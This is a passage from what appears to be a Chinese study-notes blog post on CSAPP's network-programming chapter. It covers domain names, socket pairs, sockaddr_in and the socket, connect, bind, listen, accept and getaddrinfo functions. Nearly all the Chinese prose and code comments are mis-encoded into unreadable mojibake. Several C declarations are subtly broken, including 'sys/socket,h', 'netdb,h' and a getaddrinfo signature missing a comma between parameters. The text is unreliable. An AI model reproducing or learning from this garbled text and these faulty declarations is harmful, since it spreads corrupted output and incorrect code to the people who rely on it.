<code>net</code>ã€‚</p><p>ä¸‹ä¸€å±‚æ˜¯äºŒçº§ï¼ˆsecond-levelï¼‰åŸŸåï¼Œä¾‹å¦‚ <strong>cmu. edu</strong>ï¼Œè¿™äº›åŸŸåæ˜¯ç”± ICANN çš„å„ä¸ªæˆæƒä»£ç†æŒ‰ç…§å…ˆåˆ°å…ˆæœåŠ¡çš„åŸºç¡€åˆ†é…çš„ã€‚ä¸€æ—¦ä¸€ä¸ªç»„ç»‡å¾—åˆ°äº†ä¸€ä¸ªäºŒçº§åŸŸåï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥åœ¨è¿™ä¸ªå­åŸŸä¸­åˆ›å»ºä»»ä½•æ–°çš„åŸŸåäº†ã€‚</p><p>ä¾‹å¦‚ ï¼šæˆ‘æ‹¥æœ‰äº†ä¸€ä¸ªäºŒçº§åŸŸåæ˜¯ <strong>modifier.com</strong> ï¼Œè¿™ä¸ªåŸŸåè§£æåˆ°æˆ‘çš„ä¸€ä¸ªæœåŠ¡å™¨ï¼Œé‚£ä¹ˆå®ƒçš„æ‰€æœ‰å­åŸŸå°±å½’è¿™ä¸ªæœåŠ¡å™¨ç®¡äº†ï¼Œæ¯”å¦‚æˆ‘å¯ä»¥åˆ›å»ºä¸€ä¸ª <strong>beautiful.modifier.com</strong></p><p>æ¯å°å› ç‰¹ç½‘ä¸»æœºéƒ½æœ‰æœ¬åœ°å®šä¹‰çš„åŸŸå localhostï¼Œè¿™ä¸ªåŸŸåæ€»æ˜¯æ˜ å°„ä¸º<strong>å›é€åœ°å€ï¼ˆloopback addressï¼‰127.0.0.1</strong>ï¼š</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼ŒåŸŸåå’Œ IP åœ°å€ä¹‹é—´æ˜¯ä¸€ä¸€æ˜ å°„çš„ï¼Œä½†æ˜¯æŸäº›æƒ…å†µä¸‹<strong>åŸŸåå¯ä»¥å¤šä¸ª IP åœ°å€ï¼Œä¸€ä¸ª IP åœ°å€ä¹Ÿå¯ä»¥æœ‰å¤šä¸ªåŸŸåã€‚</strong></p><h3 id="å› ç‰¹ç½‘è¿æ¥"><a href="#å› ç‰¹ç½‘è¿æ¥" class="headerlink" title="å› ç‰¹ç½‘è¿æ¥"></a>å› ç‰¹ç½‘è¿æ¥</h3><p>å› ç‰¹ç½‘å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨é€šè¿‡åœ¨è¿æ¥ä¸Šå‘é€å’Œæ¥æ”¶å­—èŠ‚æµæ¥é€šä¿¡ï¼Œä»–ä»¬æ˜¯ç‚¹å¯¹ç‚¹ï¼Œå…¨åŒå·¥ï¼Œå¯é çš„é€šä¿¡ã€‚</p><p>ä¸€ä¸ªå¥—æ¥å­—æ˜¯è¿æ¥çš„ä¸€ä¸ªç«¯ç‚¹ã€‚æ¯ä¸ªå¥—æ¥å­—éƒ½æœ‰ç›¸åº”çš„å¥—æ¥å­—åœ°å€ï¼Œæ˜¯ç”±ä¸€ä¸ªå› ç‰¹ç½‘åœ°å€å’Œä¸€ä¸ª16 ä½çš„æ•´æ•°ç«¯å£ç»„æˆçš„ï¼Œç”¨<strong>â€œ åœ°å€ï¼šç«¯å£ â€</strong>æ¥è¡¨ç¤ºã€‚</p><p>å½“å®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªè¿æ¥è¯·æ±‚æ—¶ï¼Œå®¢æˆ·ç«¯å¥—æ¥å­—åœ°å€ä¸­çš„ç«¯å£æ˜¯ç”±å†…æ ¸è‡ªåŠ¨åˆ†é…çš„ï¼Œç§°ä¸º<strong>ä¸´æ—¶ç«¯å£</strong>ï¼ˆephemeral portï¼‰ã€‚è€ŒæœåŠ¡å™¨å¥—æ¥å­—åœ°å€ä¸­çš„ç«¯å£é€šå¸¸æ˜¯æŸä¸ª<strong>çŸ¥åç«¯å£</strong>ï¼Œæ˜¯å’Œè¿™ä¸ªæœåŠ¡ç›¸å¯¹åº”çš„ã€‚ä¾‹å¦‚ï¼ŒWeb æœåŠ¡å™¨é€šå¸¸ä½¿ç”¨ç«¯å£ 80ï¼Œå®ƒå¯¹åº”çš„æœåŠ¡çš„çŸ¥ååå­—æ˜¯ httpã€‚</p><p>æœºå™¨æä¾›çš„çŸ¥ååå­—å’ŒçŸ¥åç«¯å£ä¹‹é—´çš„æ˜ å°„å­˜å‚¨åœ¨æ–‡ä»¶ <code>/etc/services</code> ä¸­</p><p>ä¸€ä¸ªè¿æ¥æ˜¯ç”±å®ƒä¸¤ç«¯çš„å¥—æ¥å­—åœ°å€å”¯ä¸€ç¡®å®šçš„ã€‚è¿™å¯¹å¥—æ¥å­—åœ°å€å«åš<strong>å¥—æ¥å­—å¯¹</strong>ï¼Œç”±ä¸‹åˆ—å…ƒç»„æ¥è¡¨ç¤ºï¼š <code>(cliaddr;cliportï¼Œservaddr:servport)</code>ã€‚</p><p>å…¶ä¸­ <em>cliaddr</em> æ˜¯å®¢æˆ·ç«¯çš„ IP åœ°å€ï¼Œ<em>cliport</em> æ˜¯å®¢æˆ·ç«¯çš„ç«¯å£ï¼›<em>servaddr</em> æ˜¯æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œè€Œ <em>servport</em> æ˜¯æœåŠ¡å™¨çš„ç«¯å£ã€‚</p><p>å¦‚ä¸‹å›¾æ˜¯ä¸€ä¸ªWebå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%A5%97%E6%8E%A5%E5%AD%97%E5%AF%B9.png"></p><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼ŒWeb å®¢æˆ·ç«¯çš„å¥—æ¥å­—åœ°å€æ˜¯ï¼š</p><p><strong>128.2.194.242:51213</strong></p><p>å…¶ä¸­ç«¯å£å· 51213 æ˜¯å†…æ ¸åˆ†é…çš„ä¸´æ—¶ç«¯å£å·ã€‚Web æœåŠ¡å™¨çš„å¥—æ¥å­—åœ°å€æ˜¯ï¼š</p><p><strong>208.216.181.15:80</strong></p><p>å…¶ä¸­ç«¯å£å· 80 æ˜¯å’Œ Web æœåŠ¡ç›¸å…³è”çš„çŸ¥åç«¯å£å·ã€‚ç»™å®šè¿™äº›å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å¥—æ¥å­—åœ°å€ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„è¿æ¥å°±ç”±ä¸‹åˆ—å¥—æ¥å­—å¯¹å”¯ä¸€ç¡®å®šäº†ï¼š</p><p><strong>(128.2.194.242:51213, 208.216.181.15:80)</strong></p><h1 id="å¥—æ¥å­—æ¥å£"><a href="#å¥—æ¥å­—æ¥å£" class="headerlink" title="å¥—æ¥å­—æ¥å£"></a>å¥—æ¥å­—æ¥å£</h1><p>å¥—æ¥å­—æ¥å£ï¼ˆsocket interfaceï¼‰æ˜¯ä¸€ç»„å‡½æ•°ï¼Œå®ƒä»¬å’Œ Unix I&#x2F;0 å‡½æ•°ç»“åˆèµ·æ¥ï¼Œç”¨ä»¥åˆ›å»ºç½‘ç»œåº”ç”¨ã€‚å¤§å¤šæ•°ç°ä»£ç³»ç»Ÿä¸Šéƒ½å®ç°å¥—æ¥å­—æ¥å£ï¼ŒåŒ…æ‹¬æ‰€æœ‰çš„ Unix å˜ç§ã€Windows å’Œ Macintosh ç³»ç»Ÿã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E5%A5%97%E6%8E%A5%E5%AD%97%E7%9A%84%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8.png"></p><h3 id="å¥—æ¥å­—åœ°å€ç»“æ„"><a href="#å¥—æ¥å­—åœ°å€ç»“æ„" class="headerlink" title="å¥—æ¥å­—åœ°å€ç»“æ„"></a>å¥—æ¥å­—åœ°å€ç»“æ„</h3><p>ä» Linux å†…æ ¸çš„è§’åº¦æ¥çœ‹ï¼Œä¸€ä¸ªå¥—æ¥å­—å°±æ˜¯é€šä¿¡çš„ä¸€ä¸ªç«¯ç‚¹ã€‚ä» Linux ç¨‹åºçš„è§’åº¦æ¥çœ‹ï¼Œå¥—æ¥å­—å°±æ˜¯ä¸€ä¸ªæœ‰ç›¸åº”æè¿°ç¬¦çš„æ‰“å¼€æ–‡ä»¶ã€‚</p><p>å› ç‰¹ç½‘çš„å¥—æ¥å­—åœ°å€å­˜æ”¾åœ¨ç±»å‹ä¸º sockaddr_in    çš„ 16 å­—èŠ‚ç»“æ„ä¸­ã€‚å¯¹äºå› ç‰¹ç½‘åº”ç”¨ï¼Œsin_family æˆå‘˜æ˜¯ AF_INETï¼Œsin_port æˆå‘˜æ˜¯ä¸€ä¸ª 16 ä½çš„ç«¯å£å·ï¼Œè€Œ sin_addr æˆå‘˜å°±æ˜¯ä¸€ä¸ª 32 ä½çš„ IP åœ°å€ã€‚IP åœ°å€å’Œç«¯å£å·æ€»æ˜¯ä»¥ç½‘ç»œå­—èŠ‚é¡ºåºï¼ˆå¤§ç«¯æ³•ï¼‰å­˜æ”¾çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* IP socket address structure */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span>       sin_family;   <span class="hljs-comment">/* åè®®æ— Protocol family (always AF_INET) */</span><br>    <span class="hljs-type">uint16_t</span>       sin_port;     <span class="hljs-comment">/* ç«¯å£å· Port number in network byte order */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">in_addr</span> <span class="hljs-title">sin_addr</span>;</span>     <span class="hljs-comment">/* å¤§ç«¯æ³•ipåœ°å€ IP address in network byte order */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>  sin_zero[<span class="hljs-number">8</span>];  <span class="hljs-comment">/* å¡«å……å­—èŠ‚ Pad to sizeof(struct sockaddr) */</span><br>&#125;;<br><br><span class="hljs-comment">/* Generic socket address structure (for connect, bind, and accept) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr</span> &#123;</span><br>    <span class="hljs-type">uint16_t</span>  sa_family;    <span class="hljs-comment">/* åè®®æ— Protocol family */</span><br>    <span class="hljs-type">char</span>      sa_data[<span class="hljs-number">14</span>];  <span class="hljs-comment">/* Address data */</span><br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œçš„ _in åç¼€æ˜¯ inernet çš„æ„æ€</p></blockquote><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä½¿ç”¨ <code>socket</code> å‡½æ•°æ¥<strong>åˆ›å»ºä¸€ä¸ªå¥—æ¥å­—æè¿°ç¬¦</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket,h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">socket</span><span class="hljs-params">(<span class="hljs-type">int</span> domain,<span class="hljs-type">int</span> type,<span class="hljs-type">int</span> protocol)</span>;<br><span class="hljs-comment">//è¿”å›:è‹¥æˆåŠŸåˆ™ä¸ºéè´Ÿæè¿°ç¬¦ï¼Œè‹¥å‡ºé”™åˆ™ä¸º-1ã€‚</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæƒ³è¦ä½¿å¥—æ¥å­—æˆä¸ºè¿æ¥çš„ä¸€ä¸ªç«¯ç‚¹ï¼Œå°±ç”¨å¦‚ä¸‹ç¡¬ç¼–ç çš„å‚æ•°æ¥è°ƒç”¨ socket å‡½æ•° <code>clientfd = Socket(AF_INETï¼ŒSOCK_STREAMï¼Œ0);</code> å…¶ä¸­ï¼Œ<em>AF_INET</em> è¡¨æ˜æˆ‘ä»¬æ­£åœ¨ä½¿ç”¨ 32 ä½ IP åœ°å€ï¼Œè€Œ <em>SOCK_STREAM</em> è¡¨ç¤ºè¿™ä¸ªå¥—æ¥å­—æ˜¯è¿æ¥çš„ä¸€ä¸ªç«¯ç‚¹ã€‚</p><p><code>socket</code> è¿”å›çš„ <code>clientfd</code> æè¿°ç¬¦ä»…æ˜¯<strong>éƒ¨åˆ†æ‰“å¼€çš„ï¼Œè¿˜ä¸èƒ½ç”¨äºè¯»å†™</strong>ã€‚å¦‚ä½•å®Œæˆæ‰“å¼€å¥—æ¥å­—çš„å·¥ä½œï¼Œå–å†³äºæˆ‘ä»¬æ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡å™¨ã€‚</p><h3 id="connect"><a href="#connect" class="headerlink" title="connect"></a>connect</h3><p>å®¢æˆ·ç«¯é€šè¿‡è°ƒç”¨ connect å‡½æ•°æ¥<strong>å»ºç«‹å’ŒæœåŠ¡å™¨çš„è¿æ¥</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">connect</span><span class="hljs-params">(<span class="hljs-type">int</span> clientfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr, <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><span class="hljs-comment">//è¿”å›:è‹¥æˆåŠŸåˆ™ä¸º 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸º-1ã€‚</span><br></code></pre></td></tr></table></figure><p><code>connect</code> å‡½æ•°è¯•å›¾ä¸å¥—æ¥å­—åœ°å€ä¸º <em>addr</em> çš„æœåŠ¡å™¨å»ºç«‹ä¸€ä¸ªå› ç‰¹ç½‘è¿æ¥ï¼Œå…¶ä¸­ <em>addrlen</em> æ˜¯ <code>sizeof(sockaddr_in)</code>ã€‚</p><p>connect å‡½æ•°ä¼šé˜»å¡ï¼Œä¸€ç›´åˆ°è¿æ¥æˆåŠŸå»ºç«‹æˆ–æ˜¯å‘ç”Ÿé”™è¯¯ã€‚å¦‚æœæˆåŠŸï¼Œ<code>clientfd</code> æè¿°ç¬¦ç°åœ¨å°±å‡†å¤‡å¥½å¯ä»¥è¯»å†™äº†ï¼Œå¹¶ä¸”å¾—åˆ°çš„è¿æ¥æ˜¯ç”±å¥—æ¥å­—å¯¹ <code>(x:y,addr.sin_addr:addr.sin_port)</code>åˆ»ç”»çš„ï¼Œå…¶ä¸­ <em>x</em> è¡¨ç¤ºå®¢æˆ·ç«¯çš„ IP åœ°å€ï¼Œè€Œ <em>y</em> è¡¨ç¤ºä¸´æ—¶ç«¯å£ï¼Œå®ƒå”¯ä¸€åœ°ç¡®å®šäº†å®¢æˆ·ç«¯ä¸»æœºä¸Šçš„å®¢æˆ·ç«¯è¿›ç¨‹ã€‚</p><h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p><code>bind</code>ã€<code>listen</code> å’Œ <code>accept</code>ï¼ŒæœåŠ¡å™¨ç”¨å®ƒä»¬æ¥<strong>å’Œå®¢æˆ·ç«¯å»ºç«‹è¿æ¥</strong>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">bind</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> sockaddr *addr,</span><br><span class="hljs-params">         <span class="hljs-type">socklen_t</span> addrlen)</span>;<br><br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸º 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><p><code>bind</code> å‡½æ•°å‘Šè¯‰å†…æ ¸å°† <em>addr</em> ä¸­çš„æœåŠ¡å™¨å¥—æ¥å­—åœ°å€å’Œå¥—æ¥å­—æè¿°ç¬¦ <code>sockfd</code> è”ç³»èµ·æ¥ã€‚å‚æ•° <em>addrlen</em> ä¹Ÿæ˜¯ <code>sizeof(sockaddr in)</code> ã€‚</p><p>å°±æ¯”å¦‚æˆ‘ä»¬åœ¨è¿™ä¸ªå‡½æ•°ä¸­æŒ‡å®š addr æ˜¯ <code>127.0.0.1ï¼š8080</code> ï¼Œé‚£ä¹ˆé€šè¿‡è¿™ä¸ª ip åœ°å€å’Œç«¯å£ï¼ˆåœ¨è¿™é‡Œå°±æ˜¯æœ¬åœ°è®¿é—®ï¼‰å°±å¯ä»¥æ‰¾åˆ°å¹¶è®¿é—®æœåŠ¡ç«¯å•¦ã€‚</p><h3 id="listen"><a href="#listen" class="headerlink" title="listen"></a>listen</h3><p>é¦–å…ˆæˆ‘ä»¬å…ˆäº†è§£ä¸»åŠ¨å®ä½“å’Œè¢«åŠ¨å®ä½“ï¼š</p><ul><li>å®¢æˆ·ç«¯æ˜¯å‘èµ·è¿æ¥è¯·æ±‚çš„ä¸»åŠ¨å®ä½“</li><li>æœåŠ¡å™¨æ˜¯ç­‰å¾…æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚çš„è¢«åŠ¨å®ä½“</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">listen</span><span class="hljs-params">(<span class="hljs-type">int</span> sockfd, <span class="hljs-type">int</span> backlog)</span>;<br><span class="hljs-comment">// è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸º 0ï¼Œè‹¥å‡ºé”™åˆ™ä¸º -1ã€‚</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå†…æ ¸ä¼šè®¤ä¸º <code>socket</code> å‡½æ•°åˆ›å»ºçš„æè¿°ç¬¦å¯¹åº”äºä¸»åŠ¨å¥—æ¥å­—ï¼Œå­˜åœ¨äºä¸€ä¸ªè¿æ¥çš„å®¢æˆ·ç«¯ã€‚</p><p>æœåŠ¡å™¨è°ƒç”¨ <code>listen</code> å‡½æ•°å°† <code>sockfd</code> ä»ä¸€ä¸ªä¸»åŠ¨å¥—æ¥å­—è½¬åŒ–ä¸ºä¸€ä¸ªç›‘å¬å¥—æ¥å­—ï¼Œå‘Šè¯‰å†…æ ¸è¿™ä¸ªæè¿°ç¬¦æ˜¯è¢«æœåŠ¡å™¨ä½¿ç”¨çš„ï¼Œè¯¥å¥—æ¥å­—å¯ä»¥æ¥å—æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚</p><h3 id="accept"><a href="#accept" class="headerlink" title="accept"></a>accept</h3><p>æœåŠ¡å™¨é€šè¿‡è°ƒç”¨ <code>accept</code> å‡½æ•°æ¥ç­‰å¾…æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(<span class="hljs-type">int</span> listenfd,<span class="hljs-keyword">struct</span> sockaddr *addr,<span class="hljs-type">int</span> *addrlen)</span>;<br><span class="hljs-comment">//è¿”å›ï¼šè‹¥æˆåŠŸåˆ™ä¸ºéè´Ÿè¿æ¥æè¿°ç¬¦ï¼Œè‹¥å‡ºé”™åˆ™ä¸º-1ã€‚</span><br></code></pre></td></tr></table></figure><p><code>accept</code> å‡½æ•°ç­‰å¾…æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥è¯·æ±‚åˆ°è¾¾ä¾¦å¬æè¿°ç¬¦ <code>listenfd</code>ï¼Œç„¶ååœ¨ <em>addr</em> ä¸­å¡«å†™å®¢æˆ·ç«¯çš„å¥—æ¥å­—åœ°å€ï¼Œå¹¶è¿”å›ä¸€ä¸ªå·²è¿æ¥æè¿°ç¬¦ï¼Œè¿™ä¸ªæè¿°ç¬¦å¯è¢«ç”¨æ¥åˆ©ç”¨ UnixI&#x2F;O å‡½æ•°ä¸å®¢æˆ·ç«¯é€šä¿¡ã€‚</p><p>ç›‘å¬æè¿°ç¬¦å’Œå·²è¿æ¥æè¿°ç¬¦ï¼š</p><ul><li>ç›‘å¬æè¿°ç¬¦ï¼šä½œä¸ºå®¢æˆ·ç«¯è¿æ¥è¯·æ±‚çš„ä¸€ä¸ªç«¯ç‚¹ï¼Œè¢«åˆ›å»ºä¸€æ¬¡ï¼ŒæœåŠ¡äºæ•´ä¸ª socket å‘¨æœŸ</li><li>å·²è¿æ¥æè¿°ç¬¦ï¼šæ¯æ¬¡è¯·æ±‚è¿æ¥æ—¶åˆ›å»ºï¼ŒåªæœåŠ¡å½“å‰å®¢æˆ·ç«¯</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-%E7%9B%91%E5%90%AC%E5%92%8C%E5%B7%B2%E8%BF%9E%E6%8E%A5%E6%8F%8F%E8%BF%B0%E7%AC%A6.png"></p><h3 id="ä¸»æœºå’ŒæœåŠ¡çš„è½¬æ¢"><a href="#ä¸»æœºå’ŒæœåŠ¡çš„è½¬æ¢" class="headerlink" title="ä¸»æœºå’ŒæœåŠ¡çš„è½¬æ¢"></a>ä¸»æœºå’ŒæœåŠ¡çš„è½¬æ¢</h3><p>Linux æä¾›äº† <code>getaddrinfo</code> å’Œ <code>getnameinfo</code> å‡½æ•°å®ç°äºŒè¿›åˆ¶å¥—æ¥å­—åœ°å€ç»“æ„å’Œä¸»æœºåã€ä¸»æœºåœ°å€ã€æœåŠ¡åå’Œç«¯å£å·çš„å­—ç¬¦ä¸²è¡¨ç¤ºä¹‹é—´çš„ç›¸äº’è½¬åŒ–ã€‚</p><h4 id="getaddrinfo"><a href="#getaddrinfo" class="headerlink" title="getaddrinfo"></a>getaddrinfo</h4><p>getaddrinfo å‡½æ•°å°†ä¸»æœºåã€ä¸»æœºåœ°å€ã€æœåŠ¡åå’Œç«¯å£å·çš„å­—ç¬¦ä¸²è¡¨ç¤ºè½¬åŒ–æˆå¥—æ¥å­—åœ°å€ç»“æ„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;netdb,h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">getaddrinfo</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *host, </span><br><span class="hljs-params">                <span class="hljs-type">const</span> <span class="hljs-type">char</span>*service,</span><br><span class="hljs-params">                <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> addrinfo *hintsstruct addrinfo **result)</span>;<br><span class="hljs-comment">//è¿”å›;å¦‚æœæˆåŠŸåˆ™ä¸º0ï¼Œå¦‚æœé”™è¯¯åˆ™ä¸ºéé›¶çš„é”™è¯¯ä»£ç </span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">freeaddrinfo</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> addrinfo *result)</span>;<br><span class="hljs-comment">//è¿”å›:æ— </span><br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">gai_strerror</span><span class="hljs-params">(<span class="hljs-type">int</span> errcode)</span>;<br><span class="hljs-comment">//è¿”å›;é”™è¯¯æ¶ˆæ¯</span><br></code></pre></td></tr></table></figure><p>æ•°æ®ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/11-getaddrinfo.png"></p><p>å‚æ•°ï¼š</p><ul><li>hostï¼šåŸŸåï¼Œæˆ–è€…æ˜¯ipåœ°å€</li><li>serviceï¼šæœåŠ¡å</li><li>hintsï¼šå¯é€‰å‚æ•°ï¼Œä¼ é€’ä¸€äº›æ ‡å¿—ä½å‚æ•°</li><li>resultï¼šæ¥æ”¶è¿”å›ç»“æœ</li></ul><p>å¦‚æœè¦ä¼ é€’ hints å‚æ•°ï¼Œåªèƒ½è®¾ç½®ä¸‹åˆ—å­—æ®µï¼šai_familyã€ai_socktypeã€ai_protocol å’Œ ai_flags å­—æ®µã€‚å…¶ä»–å­—æ®µå¿…é¡»è®¾ç½®ä¸º 0ï¼ˆæˆ– NULLï¼‰ã€‚</p><p>æˆ‘ä»¬ç”¨ memset å°†æ•´ä¸ªç»“æ„è€Œæ¸…é›¶ï¼Œç„¶åæœ‰é€‰æ‹©åœ°è®¾ç½®ä¸€äº›å­—æ®µï¼š</p><ul><li><strong>ai_flags å­—æ®µ</strong>ï¼šæˆ‘ä»¬å¯ä»¥æŠŠå„ç§å€¼ç»„åˆèµ·æ¥å¾—åˆ°è¯¥æ©ç <ul><li><strong>AI_CANONNAME</strong>ï¼šai_canonname å­—æ®µé»˜è®¤ä¸º NULLã€‚å¦‚æœè®¾ç½®äº†è¯¥æ ‡å¿—ï¼Œå°±æ˜¯å‘Šè¯‰ getaddrinfo å°†åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ª addrinfo ç»“æ„çš„ ai_canonname å­—æ®µæŒ‡å‘ host çš„æƒå¨åå­—ã€‚</li><li><strong>AI_NUMERICSERV</strong>ï¼šå‚æ•° service é»˜è®¤å¯ä»¥æ˜¯æœåŠ¡åæˆ–ç«¯å£å·ã€‚è¿™ä¸ªæ ‡å¿—å¼ºåˆ¶å‚æ•° service ä¸ºç«¯å£å·ã€‚</li><li><strong>AI_PASSIVE</strong>ï¼šgetaddrinfo é»˜è®¤è¿”å›å¥—æ¥å­—åœ°å€ï¼Œå®¢æˆ·ç«¯å¯ä»¥åœ¨è°ƒç”¨ connect æ—¶ç”¨ä½œä¸»åŠ¨å¥—æ¥å­—ã€‚è¿™ä¸ªæ ‡å¿—å‘Šè¯‰è¯¥å‡½æ•°ï¼Œè¿”å›çš„å¥—æ¥å­—åœ°å€å¯èƒ½è¢«æœåŠ¡å™¨ç”¨ä½œç›‘å¬å¥—æ¥å­—ã€‚åœ¨è¿™ç§æƒ…å†µä¸­ï¼Œå‚æ•° host åº”è¯¥ä¸º NULLã€‚å¾—åˆ°çš„å¥—æ¥å­—åœ°å€ç»“æ„ä¸­çš„åœ°å€å­—æ®µä¼šæ˜¯é€šé…ç¬¦åœ°å€ï¼ˆwildcard addressï¼‰ï¼Œå‘Šè¯‰å†…æ ¸è¿™ä¸ªæœåŠ¡å™¨ä¼šæ¥å—å‘é€åˆ°è¯¥ä¸»æœºæ‰€æœ‰ IP åœ°å€çš„è¯·æ±‚ã€‚è¿™æ˜¯æ‰€æœ‰ç¤ºä¾‹æœåŠ¡å™¨æ‰€é»˜è®¤çš„è¡Œä¸ºã€‚</li></ul></li><li><strong>ai_family</strong>ï¼šæŒ‡å®šè¿”å›åœ°å€çš„åè®®ç°‡ï¼Œå–å€¼èŒƒå›´ï¼šAF_INET(IPv4)ã€AF_INET6(IPv6)ã€AF_UNSPEC(IPv4 and IPv6)</li><li><strong>ai_socktype</strong>ï¼šç”¨äºè®¾å®šè¿”å›åœ°å€çš„ socket ç±»å‹ï¼Œå¸¸ç”¨çš„æœ‰ SOCK_STREAMã€SOCK_DGRAMã€SOCK_RAW, è®¾ç½®ä¸º 0 